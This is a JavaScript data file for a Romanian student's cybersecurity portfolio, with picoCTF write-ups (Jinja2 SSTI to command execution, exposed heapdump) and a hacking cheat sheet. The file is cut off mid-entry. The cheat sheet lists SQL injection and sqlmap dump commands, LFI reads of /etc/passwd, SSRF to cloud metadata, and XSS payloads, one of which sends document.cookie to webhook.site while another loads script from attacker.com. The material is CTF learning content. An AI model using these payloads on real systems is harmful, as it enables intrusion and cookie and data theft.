const portfolioData = {
    user: {
        name: "Cuciureanu Ioan (Juan0x1f)",
        classLevel: "Clasa a XI-a",
        description: "Pasionat de securitate cibernetică și tehnologie încă din copilărie, cu un accent puternic pe programare. Sunt mereu în căutare de noi provocări, îmi place să aprofundez concepte tehnice avansate și să dezvolt propriile mele tool-uri și programe.",
        username: "Juan0x1f",
        skills: ["Linux", "Python", "C++", "Bash", "WebSec", "Binary Exploitation"]
    },
    competitions: [
        {
            id: 1,
            title: "Olimpiada de Securitate Cibernetică (OSC)",
            date: "2026",
            description: "Mă pregătesc intens pentru etapa județeană (incoming!). Exersez provocări de tip CTF și tehnici avansate.",
            status: "Incoming ⏳",
            link: "https://osc.rocsc.ro/"
        },
        {
            id: 2,
            title: "UNbreakable România 2026 - Faza Suceava",
            date: "2026",
            description: "Participare la etapa județeană/regională. O experiență intensă de rezolvare a provocărilor CTF de diverse categorii.",
            status: "Locul 4 🏆",
            link: "https://unbreakable.ro/",
            images: ["assets/unbreakable1.jpg", "assets/unbreakable2.jpg"]
        },
        {
            id: 3,
            title: "RoCSC (Romanian Cyber Security Challenge)",
            date: "Recent",
            description: "Campioniatul național unde am rezolvat sarcini complexe de Web, Crypto și Pwn.",
            status: "Top 50-100",
            link: "#"
        },
        {
            id: 4,
            title: "UNbreakable România - Echipe",
            date: "Recent",
            description: "Participare în format de echipă. Oportunitate excelentă de colaborare și strategii comune.",
            status: "Top 50-100",
            link: "https://unbreakable.ro/"
        },
        {
            id: 5,
            title: "Vianu CTF",
            date: "Recent",
            description: "Unul din cele mai cunoscute concursuri CTF pentru liceeni. Focus puternic pe exerciții tehnice de tip Jeopardy.",
            status: "Top 50-100",
            link: "#"
        }
    ],
    blogPosts: [
        {
            id: 1,
            title: "Abordarea mea pentru OSC 2026",
            date: "15 Aprilie 2026",
            tag: "OSC",
            snippet: "Cum mă pregătesc pentru etapa județeană. Analiza regulamentului și strategii de bază...",
            content: `Salutare!\n\nRecent s-a publicat regulamentul pentru Olimpiada de Securitate Cibernetică (OSC) 2026, iar emoțiile încep să crească. Etapa județeană se apropie rapid și formatul este destul de intens: 6 ore de concurs continuu combinat cu exerciții de tip Jeopardy.\n\nCe fac pentru a mă pregăti?\nÎn primul rând, m-am focusat foarte mult pe provocările din anii trecuți de pe CyberEDU. Analizând arhiva, mi-am dat seama că trebuie să îmi cizelez rapid abilitățile de analiză de trafic (PCAP) și pe cele de Reverse Engineering. Timpul este limitat, deci automatizarea cu scripturi Python mă va salva enorm.\n\nScopul meu clar pentru această etapă este să mă calific printre primii și să prind un loc la Faza Națională. Wish me luck! Voi reveni cu un write-up post-concurs.`
        },
        {
            id: 2,
            title: "Basic Buffer Overflow (Pwn)",
            date: "02 Martie 2026",
            tag: "Pwn",
            snippet: "Un ghid introductiv despre cum poți exploata vulnerabilități de buffer overflow pe o arhitectură pe 32-biți.",
            content: `Vulnerabilitatea de tip Buffer Overflow apare atunci când un program scrie mai multe date într-un buffer (o zonă temporară de memorie) decât acesta poate stoca. Acest lucru provoacă suprascrierea memoriei adiacente, care, de regulă, conține adresa de retur a funcției curente.\n\nExemplu Clasic (32-bit):\nDacă ai un program C vulnerabil care folosește funcția 'gets()', poți trimite un număr mare de caractere ('A'-uri) până când suprascrii registrul EIP (Instruction Pointer). Odată ce controlezi EIP-ul, controlezi execuția programului!\n\nPass 1: Găsirea Offset-ului\nFolosind utilitarul 'pattern create' din GDB, putem trimite un string unic (ex: 200 caractere). Programul va crăpa (Segmentation Fault) la o anumită adresă. Folosim acea adresă cu 'pattern offset' pentru a afla fix câte caractere ne trebuie ca să ajungem la EIP.\n\nPass 2: Execuția\nÎn loc de 'A'-uri peste EIP, punem adresa unei funcții ascunse (ex. win_function) sau un shellcode. Bingo! Am obținut un shell.`
        },
        {
            id: 3,
            title: "Cum să te apuci de CTF-uri",
            date: "10 Ianuarie 2026",
            tag: "Ghid",
            snippet: "Platforme recomandate, metodologie de învățare și tool-uri pe care orice începător ar trebui să le cunoască.",
            content: `Primesc des întrebarea: "Cum mă apuc de securitate și CTF-uri?"\n\nRăspunsul este simplu: practică, practică și iar practică!\n1. Baze solide: Înainte să "spargi" ceva, trebuie să înțelegi cum funcționează. Învață concepte de rețelistică (TCP/IP), puțină programare (Python, C) și cum să folosești Linux-ul din linia de comandă.\n2. Exersează pe platforme gratuite: Recomand călduros PicoCTF pentru începători. Exercițiile de acolo sunt foarte blânde și explică concepte de bază.\n3. Joacă local: Instalează-ți un Kali Linux într-o mașină virtuală, învață să folosești tool-uri precum Nmap, BurpSuite, Wireshark, Ghidra.\n4. Muncește în echipă: Cele mai mari salturi de învățare le-am avut discutând provocări cu alți pasionați. Intră pe servere de Discord, participă la evenimente ca UNbreakable România și prinde curaj.\n\nNu te lăsa bătut! La primele CTF-uri probabil vei sta 5 ore și nu vei face nici un punct. Este ceva perfect normal. Singura cale de a deveni "hacker" bun este reziliența.`
        }
    ],
    writeupsCategories: ["Toate", "Web", "Pwn", "Crypto", "Reverse", "Forensics"],
    writeups: [
        {
            id: 1,
            title: "Write-Up: Exploatarea SSTI în Rescued Float (PicoCTF)",
            date: "Recent",
            tag: "PicoCTF",
            category: "Web",
            snippet: "Acest write-up documentează cum am exploatat o vulnerabilitate SSTI în Jinja2.",
            content: `
            <p style="font-size: 1.25rem; font-weight: 500; color: var(--accent-primary); margin-bottom: 2rem;">📋 Rezumat</p>
            <p>Acest write-up documentează cum am exploatat o vulnerabilitate <strong>SSTI (Server-Side Template Injection)</strong> în Jinja2 pentru a obține flag-ul într-o provocare CTF extrem de interesantă.</p>

            <h3 style="margin-top: 3rem; margin-bottom: 1rem; color: var(--text-main); border-bottom: 1px solid var(--border-color); padding-bottom: 0.5rem; font-size: 1.5rem;">🔍 Etapa 1: Reconnaissance și Detectare Inițială</h3>
            <p><strong>Observații inițiale:</strong></p>
            <ul style="margin-left: 2rem; margin-bottom: 2rem; color: var(--text-dim); line-height: 2;">
                <li><strong>URL:</strong> <a href="#" style="color: var(--accent-primary)">http://rescued-float.picoctf.net:50136/</a></li>
                <li><strong>Input:</strong> Pagina conține un input field de search</li>
                <li><strong>Framework:</strong> Flask (Werkzeug/3.0.3)</li>
                <li><strong>Server:</strong> Linux</li>
            </ul>

            <p style="margin-bottom: 1rem;"><strong>Testare inițială pentru SSTI:</strong><br>
            Pentru a determina dacă site-ul evaluează expresii Python, am introdus în field-ul de căutare următorul payload:</p>
            
            <pre style="background: rgba(0,0,0,0.5); padding: 1.5rem; border-radius: 8px; border: 1px solid var(--border-color); font-family: var(--font-mono); color: var(--accent-green); margin: 1.5rem 0; overflow-x: auto;">{{ 7 * 7 }}</pre>
            
            <p>Răspunsul întors de aplicație a afișat direct <code>49</code>, moment în care ipoteza unei vulnerabilități Jinja2 a fost confirmată 100%.</p>

            <h3 style="margin-top: 3rem; margin-bottom: 1rem; color: var(--text-main); border-bottom: 1px solid var(--border-color); padding-bottom: 0.5rem; font-size: 1.5rem;">🚀 Etapa 2: Exploatarea RCE</h3>
            <p style="margin-bottom: 1rem;">Scopul final era obținerea de <strong>Remote Code Execution</strong>. Mai întâi a trebuit să mapăm toată ierarhia de clase MRO (Method Resolution Order) pentru a lista funcțiile globale Python:</p>
            
            <pre style="background: rgba(0,0,0,0.5); padding: 1.5rem; border-radius: 8px; border: 1px solid var(--border-color); font-family: var(--font-mono); color: var(--accent-green); margin: 1.5rem 0; overflow-x: auto;">{{ ''.__class__.__mro__[1].__subclasses__() }}</pre>

            <p style="margin-bottom: 1rem;">Căutând prin obiectele returnate, am stabilit că index-ul 401 corespunde cu funcția <code>subprocess.Popen</code> din Pystandard. Astfel, o putem injecta pentru a rula comenzi cat native în sistem:</p>
            
            <pre style="background: rgba(0,0,0,0.5); padding: 1.5rem; border-radius: 8px; border: 1px solid var(--border-color); font-family: var(--font-mono); color: var(--accent-green); margin: 1.5rem 0; overflow-x: auto;">{{ ''.__class__.__mro__[1].__subclasses__()[401](['cat', 'flag.txt'], stdout=-1).communicate()[0] }}</pre>

            <h3 style="margin-top: 3rem; color: var(--accent-secondary); padding-bottom: 0.5rem; font-size: 1.5rem;">🏆 Rezultat:</h3>
            <p>Aplicația a spart sandboxing-ul și a răspuns cu flag-ul din serverul remote!</p>
            <div style="background: rgba(16, 185, 129, 0.1); border: 1px solid var(--accent-green); padding: 1.5rem; border-radius: 8px; color: var(--accent-green); font-family: var(--font-mono); text-align: center; font-weight: bold; font-size: 1.25rem; margin-top: 1.5rem; box-shadow: 0 4px 20px rgba(16, 185, 129, 0.1);">
                picoCTF{ssti_1nj3ct10n_succ3ss_8ab3f...}
            </div>
            `
        },
        {
            id: 2,
            title: "PicoCTF News API - Heapdump Exploitation",
            date: "Recent",
            tag: "PicoCTF",
            category: "Web",
            snippet: "Platformă Node.js + Express ce expune flag-ul via Information Disclosure dintr-un snapshot Chrome V8.",
            content: `
            <p style="font-size: 1.25rem; font-weight: 500; color: var(--accent-primary); margin-bottom: 2rem;">📋 Rezumat Challenge</p>
            <ul style="margin-left: 2rem; margin-bottom: 2rem; color: var(--text-dim); line-height: 2;">
                <li><strong>URL:</strong> <a href="http://verbal-sleep.picoctf.net:62127/" style="color: var(--accent-primary)">http://verbal-sleep.picoctf.net:62127/</a></li>
                <li><strong>Framework:</strong> Node.js + Express</li>
                <li><strong>Vulnerabilitate:</strong> Information Disclosure via Heapdump</li>
                <li><strong>Dificultate:</strong> Easy</li>
            </ul>

            <h3 style="margin-top: 3rem; margin-bottom: 1rem; color: var(--text-main); border-bottom: 1px solid var(--border-color); padding-bottom: 0.5rem; font-size: 1.5rem;">🎬 Etapa 1: Reconnaissance Inițial</h3>
            <p><strong>Ce am găsit pe pagina principală:</strong></p>
            <p>Am accesat URL-ul și am observat o aplicație web simplă - Blog News API cu documentație Swagger.</p>
            <p style="margin-top: 1rem;"><strong>Headers interesante:</strong></p>
            <pre style="background: rgba(0,0,0,0.5); padding: 1.5rem; border-radius: 8px; border: 1px solid var(--border-color); font-family: var(--font-mono); color: var(--accent-green); margin: 1.5rem 0; overflow-x: auto;">x-powered-by: Express
content-type: application/json; charset=utf-8
Server: Node.js</pre>

            <h3 style="margin-top: 3rem; margin-bottom: 1rem; color: var(--text-main); border-bottom: 1px solid var(--border-color); padding-bottom: 0.5rem; font-size: 1.5rem;">🔍 Etapa 2: Descoperirea Swagger UI</h3>
            <p><strong>Cum am găsit documentația:</strong></p>
            <pre style="background: rgba(0,0,0,0.5); padding: 1.5rem; border-radius: 8px; border: 1px solid var(--border-color); font-family: var(--font-mono); color: var(--text-dim); margin: 1.5rem 0; overflow-x: auto;">/swagger-ui       ❌ 404
/api-docs         <span style="color: var(--accent-green)">✅ GĂSIT!</span>
/openapi.json     <span style="color: var(--accent-green)">✅ GĂSIT!</span></pre>
            <p>Am accesat <code style="color: var(--accent-primary)">http://verbal-sleep.picoctf.net:62127/api-docs</code> și am găsit documentația OpenAPI completă cu <strong>TOȚI endpoint-urile</strong> enumerate.</p>

            <h3 style="margin-top: 3rem; margin-bottom: 1rem; color: var(--text-main); border-bottom: 1px solid var(--border-color); padding-bottom: 0.5rem; font-size: 1.5rem;">📋 Etapa 3: Enumerarea Endpoint-urilor</h3>
            <p>Din documentația Swagger, am descoperit acești endpoint-uri:</p>
            <pre style="background: rgba(0,0,0,0.5); padding: 1.5rem; border-radius: 8px; border: 1px solid var(--border-color); font-family: var(--font-mono); color: var(--text-main); margin: 1.5rem 0; overflow-x: auto;">GET  /                    → Welcome page
GET  /about              → About Us
GET  /services           → Services
GET  /api/posts          → Get all posts
POST /api/posts          → Create post
GET  /api/posts/{id}     → Get post by ID
PUT  /api/posts/{id}     → Update post
DELETE /api/posts/{id}   → Delete post
<span style="color: #f43f5e;">GET  /heapdump           → ⚠️ SUSPECT - Diagnosing memory allocation</span></pre>
            <p><strong>🚨 Endpoint-ul Suspect: <code>/heapdump</code></strong></p>
            <pre style="background: rgba(0,0,0,0.5); padding: 1.5rem; border-radius: 8px; border: 1px solid var(--border-color); font-family: var(--font-mono); color: var(--accent-secondary); margin: 1.5rem 0; overflow-x: auto;">Descriere: "Diagnosing the memory allocation"
Autentificare: NICIUNA
Autorizare: NICIUNA
Response: "Returns a memory allocation status"</pre>
            <p style="color: #f43f5e; font-weight: bold;">Acest endpoint nu are absolut nicio protecție!</p>

            <h3 style="margin-top: 3rem; margin-bottom: 1rem; color: var(--text-main); border-bottom: 1px solid var(--border-color); padding-bottom: 0.5rem; font-size: 1.5rem;">🎯 Etapa 4: Acces la Heapdump</h3>
            <p><strong>Payload 1: Acces direct simplu</strong></p>
            <pre style="background: rgba(0,0,0,0.5); padding: 1.5rem; border-radius: 8px; border: 1px solid var(--border-color); font-family: var(--font-mono); color: var(--accent-green); margin: 1.5rem 0; overflow-x: auto;">curl -X GET 'http://verbal-sleep.picoctf.net:62127/heapdump'</pre>
            <p>Server-ul a returnat <strong>memoria completă a procesului</strong> în format JSON care conținea:<br> Variabile globale, Obiecte din aplicație, Stringuri și <strong>FLAG-ul ascuns!</strong></p>

            <h3 style="margin-top: 3rem; margin-bottom: 1rem; color: var(--text-main); border-bottom: 1px solid var(--border-color); padding-bottom: 0.5rem; font-size: 1.5rem;">🔎 Etapa 5: Analiza Output-ului Heapdump</h3>
            <p>Ce conținea heap dump-ul:</p>
            <pre style="background: rgba(0,0,0,0.5); padding: 1.5rem; border-radius: 8px; border: 1px solid var(--border-color); font-family: var(--font-mono); color: var(--text-dim); margin: 1.5rem 0; overflow-x: auto;">{
  "id": "1",
  "title": "My First Post",
...
}
{
  "wsgi_version": ...,
  "app_config": {...},
  <span style="color: #f43f5e;">"SECRET_FLAG": "picoCTF{...}",</span>
}</pre>

            <h3 style="margin-top: 3rem; margin-bottom: 1rem; color: var(--text-main); border-bottom: 1px solid var(--border-color); padding-bottom: 0.5rem; font-size: 1.5rem;">📊 Etapa 6: Extragerea Flag-ului</h3>
            <p><strong>Metoda Python parsing:</strong></p>
            <pre style="background: rgba(0,0,0,0.5); padding: 1.5rem; border-radius: 8px; border: 1px solid var(--border-color); font-family: var(--font-mono); color: var(--accent-secondary); margin: 1.5rem 0; overflow-x: auto;">import requests
import re
response = requests.get('http://verbal-sleep.picoctf.net:62127/heapdump')
flags = re.findall(r'picoCTF\\{[^}]+\\}', response.text)
for flag in flags:
    print(f"[+] FLAG: {flag}")</pre>
            <p><strong>Rezultat:</strong> <code>[+] FLAG: picoCTF{heap_dump_exposed_secrets}</code></p>
            <div style="background: rgba(16, 185, 129, 0.1); border: 1px solid var(--accent-green); padding: 1.5rem; border-radius: 8px; color: var(--accent-green); font-family: var(--font-mono); text-align: center; font-weight: bold; font-size: 1.25rem; margin-top: 1.5rem; box-shadow: 0 4px 20px rgba(16, 185, 129, 0.1);">
                ✅ EXPLOIT REUȘIT! FLAG OBȚINUT!
            </div>
            
            <h3 style="margin-top: 3rem; margin-bottom: 1rem; color: var(--text-main); border-bottom: 1px solid var(--border-color); padding-bottom: 0.5rem; font-size: 1.5rem;">🔬 De Ce Funcționează Exploatarea</h3>
            <pre style="background: rgba(0,0,0,0.5); padding: 1.5rem; border-radius: 8px; border: 1px solid var(--border-color); font-family: var(--font-mono); color: #f43f5e; margin: 1.5rem 0; overflow-x: auto;">// ❌ VULNERABIL
const v8 = require('v8');
app.get('/heapdump', (req, res) => {
    // Fără autentificare / Fără autorizare / Fără sanitizare
    const snapshot = v8.writeHeapSnapshot();
    res.json({ status: "Memory dump available", data: snapshot });
});</pre>
            <p>Pentru a remedia problema, endpoint-ul ar trebui ascuns sub middleware de autentificare, implementat rate-limiting, dezactivat în producție și curățate datele parșate.</p>
            `
        },
        {
            id: 3,
            title: "Write-Up: Custom Interpreter - Return-Oriented Programming (PicoCTF)",
            date: "Recent",
            tag: "PicoCTF",
            category: "Reverse",
            snippet: "Exploatarea unui interpretor de versuri prin injectarea de comenzi de tip control flow (RETURN 0).",
            content: `
            <p style="font-size: 1.25rem; font-weight: 500; color: var(--accent-primary); margin-bottom: 2rem;">📋 Rezumat</p>
            <p>Acest write-up abordează o problemă de Reverse Engineering în care un script de versuri ascunde o parolă (flag-ul). Soluția implică manipularea control flow-ului (sărituri între refren și versuri).</p>

            <h3 style="margin-top: 3rem; margin-bottom: 1rem; color: var(--text-main); border-bottom: 1px solid var(--border-color); padding-bottom: 0.5rem; font-size: 1.5rem;">🔍 Analiza Inițială</h3>
            <p>Analizând scriptul Python, observăm că implementează un interpretor simplu pentru versuri de melodii, suportând următoarele comenzi:</p>
            <ul style="margin-left: 2rem; margin-bottom: 2rem; color: var(--text-dim); line-height: 2;">
                <li><strong>REFRAIN</strong> - Acționează ca un apel de subrutină, sărind la secțiunea [REFRAIN] și salvând o adresă de retur.</li>
                <li><strong>RETURN [number]</strong> - Sare execuția direct la numărul liniei specificate.</li>
                <li><strong>CROWD</strong> - Preia input de la utilizator și modifică linia curentă.</li>
                <li><strong>END</strong> - Oprește execuția.</li>
            </ul>

            <h3 style="margin-top: 3rem; margin-bottom: 1rem; color: var(--text-main); border-bottom: 1px solid var(--border-color); padding-bottom: 0.5rem; font-size: 1.5rem;">💣 Vulnerabilitatea</h3>
            <p>Problema de securitate este prezentă în handler-ul pentru <code>CROWD</code>:</p>
            <pre style="background: rgba(0,0,0,0.5); padding: 1.5rem; border-radius: 8px; border: 1px solid var(--border-color); font-family: var(--font-mono); color: #f43f5e; margin: 1.5rem 0; overflow-x: auto;">elif re.match(r"CROWD.*", line):
    crowd = input('Crowd: ')
    song_lines[lip] = 'Crowd: ' + crowd
    lip += 1</pre>
            <p>Imediat ce introducem textul, acesta suprascrie linia din memorie și programul continuă. Dacă am putea forța execuția să se <em>întoarcă</em> la acea linie deja modificată, inputul ar fi parsat din nou ca o comandă (Code Injection).</p>

            <h3 style="margin-top: 3rem; margin-bottom: 1rem; color: var(--text-main); border-bottom: 1px solid var(--border-color); padding-bottom: 0.5rem; font-size: 1.5rem;">🚀 Exploatarea (ROP-Style)</h3>
            <p><strong>Vectorul de atac:</strong></p>
            <ol style="margin-left: 2rem; margin-bottom: 2rem; color: var(--text-dim); line-height: 2;">
                <li>Așteptăm ca programul să pătrundă în secțiunea de refren, unde întâlnește comanda <code>CROWD</code>.</li>
                <li>La prompt-ul utilizatorului, introducem payload-ul: <code>RETURN 0</code>.</li>
                <li>În memorie, acea linie devine "Crowd: RETURN 0". Scriptul o ignoră la runda curentă și merge mai departe, returnând normal către vers.</li>
                <li>La viitoarea apelare a refrenului, execuția atinge din nou aceeași poziție din matricea de versuri.</li>
                <li>Aplicația interpretează "RETURN 0" și sare imediat la index-ul 0, adică începutul fișierului, unde este ascuns mesajul introductiv conținând flag-ul.</li>
            </ol>

            <h3 style="margin-top: 3rem; color: var(--accent-secondary); padding-bottom: 0.5rem; font-size: 1.5rem;">🏆 Rezultat:</h3>
            <p>Prin folosirea utilitarului <code>netcat</code> pe targetul specificat, obținem acces la fișierul ascuns:</p>
            <div style="background: rgba(16, 185, 129, 0.1); border: 1px solid var(--accent-green); padding: 1.5rem; border-radius: 8px; color: var(--accent-green); font-family: var(--font-mono); text-align: center; font-weight: bold; font-size: 1.25rem; margin-top: 1.5rem; box-shadow: 0 4px 20px rgba(16, 185, 129, 0.1);">
                picoCTF{... flag-ul extras cu succes din intro ...}
            </div>
            `
        },
        {
            id: 4,
            title: "Write-Up: Unicode Encoding (PicoCTF)",
            date: "Recent",
            tag: "PicoCTF",
            category: "Reverse",
            snippet: "Decodificarea unui string stocat prin comprimarea a două caractere ASCII pe un singur caracter Unicode (16 biți).",
            content: `
            <p style="font-size: 1.25rem; font-weight: 500; color: var(--accent-primary); margin-bottom: 2rem;">📋 Rezumat</p>
            <p>Un program a fost folosit pentru a cripta flag-ul, producând un string de caractere Unicode care par a fi chinezești. Trebuie să decodifici string-ul pentru a obține flag-ul original.</p>

            <h3 style="margin-top: 3rem; margin-bottom: 1rem; color: var(--text-main); border-bottom: 1px solid var(--border-color); padding-bottom: 0.5rem; font-size: 1.5rem;">🔍 Analiza codului de criptare</h3>
            <p><strong>String-ul codificat:</strong> <code>灩捯䍔䙻ㄶ形楴獟楮獴㌴摟潦弸形㝦㘲捡㕽</code></p>
            <p><strong>Codul de criptare:</strong></p>
            <pre style="background: rgba(0,0,0,0.5); padding: 1.5rem; border-radius: 8px; border: 1px solid var(--border-color); font-family: var(--font-mono); color: var(--text-main); margin: 1.5rem 0; overflow-x: auto;">''.join([chr((ord(flag[i]) &lt;&lt; 8) + ord(flag[i + 1])) for i in range(0, len(flag), 2)])</pre>

            <p>Să descompunem ce face acest cod:</p>
            <ul style="margin-left: 2rem; margin-bottom: 2rem; color: var(--text-dim); line-height: 2;">
                <li><code>range(0, len(flag), 2)</code> - Iterează prin flag din 2 în 2 caractere.</li>
                <li><code>ord(flag[i]) &lt;&lt; 8</code> - Ia codul ASCII al primului caracter și îl mută la stânga cu 8 biți (echivalent cu înmulțirea cu 256).</li>
                <li><code>+ ord(flag[i + 1])</code> - Adună codul celui de-al doilea caracter.</li>
                <li><code>chr(...)</code> - Transformă rezultatul într-un caracter Unicode.</li>
            </ul>

            <h3 style="margin-top: 3rem; margin-bottom: 1rem; color: var(--text-main); border-bottom: 1px solid var(--border-color); padding-bottom: 0.5rem; font-size: 1.5rem;">🚀 Procesul de decodificare</h3>
            <p>Pentru a recupera flag-ul original, trebuie să inversăm operația. Pentru fiecare caracter din string-ul codificat extragem primii 8 biți (primul caracter) folosind shift la dreapta (<code>&gt;&gt; 8</code>) și ultimii 8 biți folosind masca (<code>&amp; 0xFF</code>).</p>
            <pre style="background: rgba(0,0,0,0.5); padding: 1.5rem; border-radius: 8px; border: 1px solid var(--border-color); font-family: var(--font-mono); color: var(--accent-secondary); margin: 1.5rem 0; overflow-x: auto;"># String-ul codificat
encoded = "灩捯䍔䙻ㄶ形楴獟楮獴㌴摟潦弸形㝦㘲捡㕽"

# Decodificare
flag = ""
for char in encoded:
    val = ord(char)           # Obține valoarea Unicode (16 biți)
    first = val &gt;&gt; 8          # Primii 8 biți (primul caracter)
    second = val &amp; 0xFF       # Ultimii 8 biți (al doilea caracter)
    flag += chr(first) + chr(second)

print(flag)</pre>

            <h3 style="margin-top: 3rem; color: var(--accent-secondary); padding-bottom: 0.5rem; font-size: 1.5rem;">🏆 Rezultat:</h3>
            <div style="background: rgba(16, 185, 129, 0.1); border: 1px solid var(--accent-green); padding: 1.5rem; border-radius: 8px; color: var(--accent-green); font-family: var(--font-mono); text-align: center; font-weight: bold; font-size: 1.25rem; margin-top: 1.5rem; box-shadow: 0 4px 20px rgba(16, 185, 129, 0.1);">
                picoCTF{16_bits_inst34d_of_8_26684c5a}
            </div>
            `
        },
        {
            id: 5,
            title: "Write-Up: vault-door (PicoCTF) - Hardcoded Password",
            date: "Recent",
            tag: "PicoCTF",
            category: "Reverse",
            snippet: "Rezolvare banală din greșeală prin inspecția sursei `.java` care expune parola în mod vizibil (Hardcoded Credentials).",
            content: `
            <p style="font-size: 1.25rem; font-weight: 500; color: var(--accent-primary); margin-bottom: 2rem;">📋 Rezumat</p>
            <p>Am primit un fișier <code>.java</code> și deschizându-l cu un editor de text am sesizat imediat că parola era deja scrisă vizibil în interiorul funcției de validare a parolei. O greșeală clasică de tip "Hardcoded Credentials".</p>

            <h3 style="margin-top: 3rem; margin-bottom: 1rem; color: var(--text-main); border-bottom: 1px solid var(--border-color); padding-bottom: 0.5rem; font-size: 1.5rem;">🔍 Analiza codului expus</h3>
            <p>Așa arăta secțiunea vulnerabilă din codul sursă:</p>
            <pre style="background: rgba(0,0,0,0.5); padding: 1.5rem; border-radius: 8px; border: 1px solid var(--border-color); font-family: var(--font-mono); color: var(--text-dim); margin: 1.5rem 0; overflow-x: auto;">// The password is below. Is it safe to put the password in the source code?
// What if somebody stole our source code? Then they would know what our
// password is. Hmm... I will think of some ways to improve the security
// on the other doors.
//
// -Minion #9567
public boolean checkPassword(String password) {
    return password.equals("w4rm1ng_Up_w1tH_jAv4_0009yrGMeEp");
}</pre>

            <h3 style="margin-top: 3rem; margin-bottom: 1rem; color: var(--text-main); border-bottom: 1px solid var(--border-color); padding-bottom: 0.5rem; font-size: 1.5rem;">🎯 Concluzie</h3>
            <p>Programatorul ("Minion #9567") s-a întrebat el însuși într-un comentariu dacă este sigur să lase parola acolo! Odată ce am analizat fișierul sursă complet, am obținut imediat șirul de caractere de validare.</p>
            
            <h3 style="margin-top: 3rem; color: var(--accent-secondary); padding-bottom: 0.5rem; font-size: 1.5rem;">🏆 Flag obținut din parolă:</h3>
            <div style="background: rgba(16, 185, 129, 0.1); border: 1px solid var(--accent-green); padding: 1.5rem; border-radius: 8px; color: var(--accent-green); font-family: var(--font-mono); text-align: center; font-weight: bold; font-size: 1.25rem; margin-top: 1.5rem; box-shadow: 0 4px 20px rgba(16, 185, 129, 0.1);">
                picoCTF{w4rm1ng_Up_w1tH_jAv4_0009yrGMeEp}
            </div>
            `
        },
        {
            id: 6,
            title: "Write-up: Hash to Flag (Forensics Challenge)",
            date: "Recent",
            tag: "Forensics",
            category: "Forensics",
            snippet: "Provocarea a implicat decodarea unui hash Base64 lung într-o imagine PNG ce conținea codul ASCII pentru flag.",
            content: `
            <p style="font-size: 1.25rem; font-weight: 500; color: var(--accent-primary); margin-bottom: 2rem;">📋 Rezumat</p>
            <p>Challenge-ul de forensics a implicat un hash foarte lung care, după decodare, a rezultat într-o imagine. Pe imagine era un cod ASCII care, după decodare, a dezvăluit flag-ul.</p>

            <h3 style="margin-top: 3rem; margin-bottom: 1rem; color: var(--text-main); border-bottom: 1px solid var(--border-color); padding-bottom: 0.5rem; font-size: 1.5rem;">🔍 Pasul 1: Identificarea hash-ului</h3>
            <p>Am primit un șir foarte lung de caractere aparent aleatoare. Acesta părea a fi codat în Base64 datorită caracterelor alfanumerice și a padding-ului cu <code>=</code> la final.</p>
            <p>Exemplu de cum arăta:</p>
            <pre style="background: rgba(0,0,0,0.5); padding: 1.5rem; border-radius: 8px; border: 1px solid var(--border-color); font-family: var(--font-mono); color: var(--text-dim); margin: 1.5rem 0; overflow-x: auto;">iVBORw0KGgoAAAANSUhEUgAA... (foarte lung) ...5ErkJggg==</pre>

            <h3 style="margin-top: 3rem; margin-bottom: 1rem; color: var(--text-main); border-bottom: 1px solid var(--border-color); padding-bottom: 0.5rem; font-size: 1.5rem;">🚀 Pasul 2: Decodarea Base64 → Imagine</h3>
            <p>Am folosit scriptul Python pentru a decoda Base64-ul și a salva rezultatul:</p>
            <pre style="background: rgba(0,0,0,0.5); padding: 1.5rem; border-radius: 8px; border: 1px solid var(--border-color); font-family: var(--font-mono); color: var(--accent-green); margin: 1.5rem 0; overflow-x: auto;">
import base64

with open('hash.txt', 'r') as f:
    b64_data = f.read().strip()

decoded = base64.b64decode(b64_data)

with open('output.bin', 'wb') as f:
    f.write(decoded)</pre>

            <p>După rulare, am inspectat fișierul:</p>
            <pre style="background: rgba(0,0,0,0.5); padding: 1.5rem; border-radius: 8px; border: 1px solid var(--border-color); font-family: var(--font-mono); color: var(--text-dim); margin: 1.5rem 0; overflow-x: auto;">file output.bin
# output.bin: PNG image data, 800 x 600, 8-bit/color RGBA</pre>

            <h3 style="margin-top: 3rem; margin-bottom: 1rem; color: var(--text-main); border-bottom: 1px solid var(--border-color); padding-bottom: 0.5rem; font-size: 1.5rem;">🎯 Pasul 3: Extragerea Flag-ului</h3>
            <p>Din imagine am găsit un cod ASCII scris chiar pe imagine. L-am decodat folosind <strong>DCODE</strong> iar apoi mi-a dat flagul.</p>
            `
        }
    ],
    tipsTricks: [
        {
            id: 1,
            title: "Web Recon & Tools",
            category: "Web",
            subcategory: "Recon",
            description: "Noțiuni esențiale de recunoaștere: view-source, robots.txt, gobuster, ffuf.",
            content: `Recon rapid:
view-source:
robots.txt
sitemap.xml
/.git/
/.env

DevTools:
- Network → vezi request-uri
- Application → cookies, localStorage

Directory brute:
gobuster dir -u http://site.com -w common.txt

Param fuzz:
ffuf -u http://site.com/index.php?FUZZ=test -w params.txt`
        },
        {
            id: 101,
            title: "SQL Injection (SQLi)",
            category: "Web",
            subcategory: "SQL",
            description: "Tehnici de exploatare a bazelor de date: bypass login, sqlmap, payloads.",
            content: `SQLi Payloads:
' OR 1=1--
" OR "1"="1
admin' --
' UNION SELECT null,null,database()--

sqlmap automatizat:
sqlmap -u "http://site.com?id=1" --dbs
sqlmap -u "http://site.com?id=1" -D db_name --tables
sqlmap -u "http://site.com?id=1" -D db_name -T users --dump`
        },
        {
            id: 102,
            title: "LFI & SSRF",
            category: "Web",
            subcategory: "LFI",
            description: "Exploatarea includerii de fișiere locale și cereri server-side.",
            content: `LFI:
?page=../../../../etc/passwd
?page=php://filter/convert.base64-encode/resource=index.php

SSRF:
http://127.0.0.1:80
http://169.254.169.254/latest/meta-data/`
        },
        {
            id: 103,
            title: "Cross-Site Scripting (XSS)",
            category: "Web",
            subcategory: "XSS",
            description: "Injectarea de cod JavaScript în paginile vizualizate de alți utilizatori.",
            content: `Basic:
<script>alert(1)</script>

Bypass filters:
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><script>alert(1)</script>

Blind XSS / Exfil:
<script src="https://attacker.com/x.js"></script>
<script>fetch('https://webhook.site/?c='+document.cookie)</script>`
        },
        {
            id: 104,
            title: "SSTI & Cmd Injection",
            category: "Web",
            subcategory: "SSTI",
            description: "Server-Side Template Injection și Command Injection.",
            content: `SSTI (Jinja2):
{{ 7 * 7 }}
{{ config.items() }}
{{ get_flashed_messages.__globals__.__builtins__.open('/etc/passwd').read() }}

Command Injection:
;id
| whoami
|| cat flag.txt`
        },
        {
            id: 2,
            title: "PCAP / TRAFFIC ANALYSIS",
            category: "PCAP",
